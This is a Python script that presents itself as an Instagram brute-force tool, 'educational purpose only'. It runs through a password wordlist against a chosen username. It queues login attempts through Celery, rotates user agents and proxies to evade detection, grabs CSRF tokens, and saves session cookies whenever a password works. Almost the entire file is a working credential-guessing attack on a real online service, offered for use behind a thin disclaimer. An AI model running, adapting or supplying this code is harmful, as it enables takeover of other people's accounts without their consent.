import asyncio
import aiohttp
import json
import logging
import os
import random
import time
from celery import Celery

app = Celery('insta_tasks', broker='amqp://guest:guest@localhost//', backend='db+sqlite:///insta_results.sqlite')

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15 Safari/605.1.15"
]

PROXIES = [
    "http://proxy1:8080",
    "socks5://proxy2:1080",
]

# Setup logging
logging.basicConfig(filename="instagram_login.log", level=logging.INFO)

def print_banner():
    RED = "\033[91m"
    DARKGRAY_BG = "\033[100m"
    RESET = "\033[0m"
    BOLD = "\033[1m"
    CYAN = "\033[96m"
    YELLOW = "\033[93m"

    logo = f"""
{RED}{BOLD}
   ____           _       
  / ___|  __ _ __| | ___  
 | |  _  / _` / _` |/ _ \ 
 | |_| | (_| | (_| |  __/ 
  \____| \__,_|\__,_|\___|
{RESET}
"""

    print(DARKGRAY_BG + " " * 60 + RESET)
    print(DARKGRAY_BG + " " * 4 + RED + BOLD + "INSTAGRAM BRUTEFORCE TOOL (EDU PURPOSE ONLY)" + RESET + DARKGRAY_BG + " " * 4 + RESET)
    print(DARKGRAY_BG + " " * 60 + RESET)

    print(logo)
    print(f"{CYAN}{BOLD}Created by:{RESET} {YELLOW}saju sajjad jee{RESET}")
    print(f"{CYAN}{BOLD}Contact:{RESET}  saju.sajjad@example.com  (replace with your email)")
    print(f"{CYAN}{BOLD}GitHub:{RESET}   https://github.com/sajusajjad")
    print()
    print(f"{RED}{BOLD}WARNING:{RESET} This tool is for {YELLOW}EDUCATIONAL PURPOSE ONLY{RESET} and {YELLOW}AUTHORIZATION REQUIRED{RESET} to test accounts.")
    print()
    print(DARKGRAY_BG + " " * 60 + RESET)
    print()

async def instagram_login(username, password, proxy=None):
    user_agent = random.choice(USER_AGENTS)
    session_id = str(int(time.time() * 1000))

    headers = {
        "User-Agent": user_agent,
        "X-CSRFToken": "missing",  # will update after preflight
        "X-Instagram-AJAX": "1",
        "X-Requested-With": "XMLHttpRequest",
        "Referer": "https://www.instagram.com/accounts/login/",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "/"
    }

    login_url = "https://www.instagram.com/accounts/login/ajax/"

    cookies = {"ig_cb": "1"}
    login_data = {
        "username": username,
        "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{session_id}:{password}",
        "queryParams": "{}",
        "optIntoOneTap": "false"
    }

    timeout = aiohttp.ClientTimeout(total=20)
    connector = aiohttp.TCPConnector(ssl=False)
    if proxy:
        connector = aiohttp.ProxyConnector.from_url(proxy)

    async with aiohttp.ClientSession(timeout=timeout, connector=connector, cookies=cookies) as session:
        # Fetch CSRF token first
        try:
            async with session.get("https://www.instagram.com/accounts/login/", headers=headers) as resp:
                for key in session.cookie_jar:
                    if key.key == 'csrftoken':
                        headers["X-CSRFToken"] = key.value
                        break
        except Exception as e:
            logging.error(f"[{username}] Failed to fetch CSRF: {e}")
            return {"username": username, "success": False, "error": "csrf_fetch_error"}

        try:
            async with session.post(login_url, data=login_data, headers=headers) as response:
                result = await response.json()
                if result.get("authenticated"):
                    logging.info(f"[{username}] Login SUCCESS")
                    return {"username": username, "success": True, "cookies": session.cookie_jar.filter_cookies("https://www.instagram.com")}
                elif result.get("message") == "checkpoint_required":
                    logging.warning(f"[{username}] Checkpoint (2FA or verification required)")
                    return {"username": username, "success": False, "error": "checkpoint_required"}
                else:
                    logging.warning(f"[{username}] Login FAILED - {result}")
                    return {"username": username, "success": False, "error": result}
        except Exception as e:
            logging.error(f"[{username}] Login exception: {e}")
            return {"username": username, "success": False, "error": "exception"}

@app.task(bind=True)
def login_task(self, username, password):
    proxy = random.choice(PROXIES)
    result = asyncio.run(instagram_login(username, password, proxy))
    # Ensure sessions dir exists
    os.makedirs("sessions", exist_ok=True)
    with open(f"sessions/insta_{username}.json", "w") as f:
        json.dump(result, f, indent=2)
    return result

def run_wordlist(username, wordlist_path):
    print_banner()

    if not os.path.exists(wordlist_path):
        print(f"Error: Wordlist file '{wordlist_path}' does not exist.")
        return

    with open(wordlist_path, "r") as f:
        passwords = [line.strip() for line in f if line.strip()]

    print(f"Loaded {len(passwords)} passwords from {wordlist_path}")
    print(f"Queueing login tasks for user: {username}\n")

    for pwd in passwords:
        result = login_task.delay(username, pwd)
        print(f"Queued login attempt for password: '{pwd}' (task id: {result.id})")

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 3:
        print("Usage: python Insta.py <username> <wordlist_path>")
        sys.exit(1)

    username_arg = sys.argv[1]
    wordlist_arg = sys.argv[2]
    run_wordlist(username_arg, wordlist_arg)
